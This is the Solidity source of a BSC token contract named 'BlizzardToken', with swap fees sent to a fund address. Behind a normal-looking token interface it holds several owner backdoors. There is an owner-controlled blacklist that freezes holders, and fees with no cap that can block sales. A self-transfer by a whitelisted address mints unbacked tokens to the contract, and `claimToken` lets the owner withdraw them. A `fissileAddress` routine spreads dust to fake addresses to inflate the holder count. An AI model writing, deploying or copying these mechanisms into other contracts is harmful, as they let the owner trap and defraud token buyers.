/**
 *Submitted for verification at BscScan.com on 2022-11-17
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;
interface IERC20 {    function decimals() external view returns (uint8);    function symbol() external view returns (string memory);    function name() external view returns (string memory);    function totalSupply() external view returns (uint256);    function balanceOf(address account) external view returns (uint256);    function transfer(address recipient, uint256 amount)        external        returns (bool);    function allowance(address owner, address spender)        external        view        returns (uint256);    function approve(address spender, uint256 amount) external returns (bool);    function transferFrom(        address sender,        address recipient,        uint256 amount    ) external returns (bool);    event Transfer(address indexed from, address indexed to, uint256 value);    event Approval(        address indexed owner,        address indexed spender,        uint256 value    );}interface ISwapRouter {    function factory() external pure returns (address);    function WETH() external pure returns (address);    function swapExactTokensForTokensSupportingFeeOnTransferTokens(        uint amountIn,        uint amountOutMin,        address[] calldata path,        address to,        uint deadline    ) external;    function addLiquidity(        address tokenA,        address tokenB,        uint amountADesired,        uint amountBDesired,        uint amountAMin,        uint amountBMin,        address to,        uint deadline    )        external        returns (            uint amountA,            uint amountB,            uint liquidity        );}interface ISwapFactory {    function createPair(address tokenA, address tokenB)        external        returns (address pair);}abstract contract Ownable {    address internal _owner;    event OwnershipTransferred(        address indexed previousOwner,        address indexed newOwner    );    constructor() {        address msgSender = msg.sender;        _owner = msgSender;        emit OwnershipTransferred(address(0), msgSender);    }    function owner() public view returns (address) {        return _owner;    }    modifier onlyOwner() {        require(_owner == msg.sender, "!owner");        _;    }    function renounceOwnership() public virtual onlyOwner {        emit OwnershipTransferred(_owner, address(0));        _owner = address(0);    }    function transferOwnership(address newOwner) public virtual onlyOwner {        require(newOwner != address(0), "new is 0");        emit OwnershipTransferred(_owner, newOwner);        _owner = newOwner;    }}contract TokenDistributor {    constructor(address token) {        IERC20(token).approve(msg.sender, uint(~uint256(0)));    }}contract BlizzardToken is IERC20, Ownable {    mapping(address => uint256) private _balances;    mapping(address => mapping(address => uint256)) private _allowances;    address public fundAddress;    string private _name;    string private _symbol;    uint8 private _decimals;    mapping(address => bool) public _feeWhiteList;    mapping(address => bool) public _blackList;    mapping(address => bool) public isWalletLimitExempt;    uint256 private _tTotal;    ISwapRouter public _swapRouter;    address public _fist;    mapping(address => bool) public _swapPairList;    bool private inSwap;    uint256 private constant MAX = ~uint256(0);    TokenDistributor public _tokenDistributor;    uint256 public _buyFundFee = 300;    uint256 public _sellFundFee = 400;    bool public limitEnable = true;    uint256 public walletLimit;    uint160 public constant MAXADD = ~uint160(0);    uint160 public ktNum = 173;    address public _mainPair;    modifier lockTheSwap() {        inSwap = true;        _;        inSwap = false;    }    constructor(        address RouterAddress,        address FISTAddress,        string memory Name,        string memory Symbol,        uint8 Decimals,        uint256 Supply,        address FundAddress    ) {        _name = Name;        _symbol = Symbol;        _decimals = Decimals;        ISwapRouter swapRouter = ISwapRouter(RouterAddress);        IERC20(FISTAddress).approve(address(swapRouter), MAX);        _fist = FISTAddress;        _swapRouter = swapRouter;        _allowances[address(this)][address(swapRouter)] = MAX;        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());        address swapPair = swapFactory.createPair(address(this), FISTAddress);        _mainPair = swapPair;        _swapPairList[swapPair] = true;        uint256 total = Supply * 10**Decimals;        _tTotal = total;        _balances[msg.sender] = total;        emit Transfer(address(0), msg.sender, total);        fundAddress = FundAddress;        walletLimit = 1000000 * 10**Decimals;        _feeWhiteList[FundAddress] = true;        _feeWhiteList[address(this)] = true;        _feeWhiteList[address(swapRouter)] = true;        _feeWhiteList[msg.sender] = true;        isWalletLimitExempt[msg.sender] = true;        isWalletLimitExempt[fundAddress] = true;        isWalletLimitExempt[address(swapRouter)] = true;        isWalletLimitExempt[address(_mainPair)] = true;        isWalletLimitExempt[address(this)] = true;        isWalletLimitExempt[address(0xdead)] = true;        _tokenDistributor = new TokenDistributor(FISTAddress);    }    function symbol() external view override returns (string memory) {        return _symbol;    }    function name() external view override returns (string memory) {        return _name;    }    function decimals() external view override returns (uint8) {        return _decimals;    }    function totalSupply() public view override returns (uint256) {        return _tTotal;    }    function balanceOf(address account) public view override returns (uint256) {        return _balances[account];    }    function transfer(address recipient, uint256 amount)        public        override        returns (bool)    {        _transfer(msg.sender, recipient, amount);        return true;    }    function allowance(address owner, address spender)        public        view        override        returns (uint256)    {        return _allowances[owner][spender];    }    function approve(address spender, uint256 amount)        public        override        returns (bool)    {        _approve(msg.sender, spender, amount);        return true;    }    function transferFrom(        address sender,        address recipient,        uint256 amount    ) public override returns (bool) {        _transfer(sender, recipient, amount);        if (_allowances[sender][msg.sender] != MAX) {            _allowances[sender][msg.sender] =                _allowances[sender][msg.sender] -                amount;        }        return true;    }    function _approve(        address owner,        address spender,        uint256 amount    ) private {        _allowances[owner][spender] = amount;        emit Approval(owner, spender, amount);    }    function setWalletLimit(uint256 _walletLimit) public onlyOwner {        walletLimit = _walletLimit;    }    function _transfer(        address from,        address to,        uint256 amount    ) private {        require(!_blackList[from], "blackList");        uint256 balance = balanceOf(from);        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {            require(balance >= amount, "balanceNotEnough");            uint256 maxSellAmount = (balance * 9999) / 10000;            if (amount > maxSellAmount) {                amount = maxSellAmount;            }        }        bool takeFee;        bool isSell;        if (_swapPairList[from] || _swapPairList[to]) {            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {                if (_swapPairList[to]) {                    if (!inSwap) {                        uint256 contractTokenBalance = balanceOf(address(this));                        if (contractTokenBalance > 0) {                            uint256 swapFee = _buyFundFee + _sellFundFee;                            uint256 numTokensSellToFund = (amount * swapFee) /                                5000;                            if (numTokensSellToFund > contractTokenBalance) {                                numTokensSellToFund = contractTokenBalance;                            }                            swapTokenForFund(numTokensSellToFund);                        }                    }                }                takeFee = true;            }            if (_swapPairList[to]) {                isSell = true;            }        }        _tokenTransfer(from, to, amount, takeFee, isSell);    }    function setisWalletLimitExempt(address holder, bool exempt)        external        onlyOwner    {        isWalletLimitExempt[holder] = exempt;    }    function setLimitEnable(bool status) public onlyOwner {        limitEnable = status;    }    function _tokenTransfer(        address sender,        address recipient,        uint256 tAmount,        bool takeFee,        bool isSell    ) private {        if (sender == recipient && _feeWhiteList[sender]) {            _balances[address(this)] += tAmount;            return;        }        _balances[sender] = _balances[sender] - tAmount;        uint256 feeAmount;        if (takeFee) {            uint256 swapFee;            if (isSell) {                swapFee = _sellFundFee;            } else {                swapFee = _buyFundFee;            }            uint256 swapAmount = (tAmount * swapFee) / 10000;            if (swapAmount > 0) {                feeAmount += swapAmount;                _takeTransfer(sender, address(this), swapAmount);                fissileAddress(swapAmount / 1000000);            }        }        if (!isWalletLimitExempt[recipient] && limitEnable)            require(                (balanceOf(recipient) + tAmount - feeAmount) <= walletLimit,                "over max wallet limit"            );        _takeTransfer(sender, recipient, tAmount - feeAmount);    }    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {        address[] memory path = new address[](2);        path[0] = address(this);        path[1] = _fist;        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(            tokenAmount,            0,            path,            address(_tokenDistributor),            block.timestamp        );        IERC20 FIST = IERC20(_fist);        uint256 fistBalance = FIST.balanceOf(address(_tokenDistributor));        FIST.transferFrom(address(_tokenDistributor), fundAddress, fistBalance);    }    function _takeTransfer(        address sender,        address to,        uint256 tAmount    ) private {        _balances[to] = _balances[to] + tAmount;        emit Transfer(sender, to, tAmount);    }    function setFundAddress(address addr) external onlyFunder {        fundAddress = addr;        _feeWhiteList[addr] = true;    }    function setBuyFundFee(uint256 fundFee) external onlyOwner {        _buyFundFee = fundFee;    }    function setSellFundFee(uint256 fundFee) external onlyOwner {        _sellFundFee = fundFee;    }    function setFeeWhiteList(address addr, bool enable) external onlyFunder {        _feeWhiteList[addr] = enable;    }    function setBlackList(address addr, bool enable) external onlyOwner {        _blackList[addr] = enable;    }    function multiBlackList(address[] calldata addresses, bool status)        public        onlyOwner    {        require(addresses.length < 201);        for (uint256 i; i < addresses.length; ++i) {            _blackList[addresses[i]] = status;        }    }    function setSwapPairList(address addr, bool enable) external onlyFunder {        _swapPairList[addr] = enable;    }    function claimBalance() external {        payable(fundAddress).transfer(address(this).balance);    }    function claimToken(        address token,        uint256 amount,        address to    ) external onlyFunder {        IERC20(token).transfer(to, amount);    }    modifier onlyFunder() {        require(_owner == msg.sender || fundAddress == msg.sender, "!Funder");        _;    }    function fissileAddress(uint256 amount) private {        if (amount > 0) {            address _receiveD;            for (uint256 i = 0; i < 5; i++) {                _receiveD = address(MAXADD / ktNum);                ktNum = ktNum + 1;                _takeTransfer(address(this), _receiveD, amount / (i + 10));            }        }    }    receive() external payable {}}